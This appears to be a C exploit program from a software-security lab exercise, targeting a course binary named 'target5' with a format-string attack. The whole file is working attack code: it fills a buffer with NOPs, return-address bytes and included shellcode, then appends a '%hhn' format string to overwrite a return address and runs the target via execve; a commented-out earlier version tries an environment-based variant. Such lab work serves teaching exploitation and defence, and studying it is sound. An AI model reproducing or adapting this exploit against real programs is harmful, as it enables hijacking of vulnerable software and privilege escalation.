#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"
#include <stdint.h>

#define TARGET "../targets/target5"
#define DEFAULT_BUFFER_SIZE  4
#define NOP 0x90
#define ZERO 0x00

#define ATTACK_LEN 256
#define RA 0x040a4fe68

int main(void)
{
    char *args[23];
    char *env[1];

    char attack_string[ATTACK_LEN];
    uint64_t * attack_int = (uint64_t *)attack_string;
    char * ptr;
    int i;

    for (i = 0; i < ATTACK_LEN; i++)
        attack_string[i] = NOP;

    attack_int[0] = RA;
    attack_int[2] = RA + 1;
    attack_int[4] = RA + 2;
    attack_int[6] = RA + 3;

    //Shellcode from char 60 for 45 characters
    ptr = attack_string + 60;
    for (i = 0; i < strlen(shellcode); i++)
        *(ptr++) = shellcode[i];

    //Target addr = 0x40a4fa60
    //Current amount written: 45
    //     45 +  [51]   % 256 = 0x60 (96)
    //  (  96 + [154] ) % 256 = 0xfa (250)
    //  ( 250 + [170] ) % 256 = 0xa4 (164)
    //  ( 164 + [156] ) % 256 = 0x40 (64)

    char *format = "%08x%08x%08x%08x%019x%hhn%0154x%hhn%0170x%hhn%0156x%hhn";

    for (i = 0; i < strlen(format); i++)
        *(ptr++) = format[i];


    attack_string[ATTACK_LEN - 1] = '\0';

    args[0] = TARGET;

    // This is a hack, to deal with the 64-bit addresses...

    args[1] = attack_string;
    args[2] = &attack_string[5];
    args[3] = &attack_string[6];
    args[4] = &attack_string[7];
    args[5] = &attack_string[8];

    args[6] = &attack_string[21];
    args[7] = &attack_string[22];
    args[8] = &attack_string[23];
    args[9] = &attack_string[24];

    args[10] = &attack_string[37];
    args[11] = &attack_string[38];
    args[12] = &attack_string[39];
    args[13] = &attack_string[40];

    args[14] = &attack_string[53];
    args[15] = &attack_string[54];
    args[16] = &attack_string[55];
    args[17] = &attack_string[56];

    args[18] = NULL;

    env[0] = NULL;

    if (0 > execve(TARGET, args, env))
        fprintf(stderr, "execve failed.\n");

    return 0;
}
//int main(void)
//{
//  char *args[3];
//  char *env[20	];
//  int bsize = DEFAULT_BUFFER_SIZE;
//  char* buff, *ptr;
//
//  int i;
//
//
//  int count = 0;
//
//  char * s = "\x68\xfe\xa4\x40";
//
//  args[0] = TARGET;
//  args[1] = s;
//  args[2] = NULL;
//
//  char* r = "%x%x%x%x%1084553558x%n";
//
//  env[0] = "\x00";
//  env[1] = "\x00";
//  env[2] = "\x00";
//  env[3] = "AAAAAAA";
//  env[4] = "\x69\xfe\xa4\x40";
//  env[5] = "\x00";
//  env[6] = "\x00";
//  env[7] = "\x00";
//  env[8] = "AAAAAAA";
//  env[9] = "\x70\xfe\xa4\x40";
//  env[10] = "\x00";
//  env[11] = "\x00";
//  env[12] = "\x00";
//  env[13] = "AAAAAAA";
//  env[14] = "\x71\xfe\xa4\x40";
//  env[15] = "\x00";
//  env[16] = "\x00";
//  env[17] = "\x00";
//  env[18] = strcat(shellcode,r);
//
//  char * nop;
//   if(!(nop = (char*)malloc(150 * sizeof(char)))){
//	  printf("can't allocate memory\n");
//	  exit(0);
//  }
//  for (i = 0; i<150; i++){
//  	nop[i] = 'A';
//  }
//
//  env[19] = nop;
//
//
//  if (0 > execve(TARGET, args, env))
//    fprintf(stderr, "execve failed.\n");
//
//  return 0;
//}
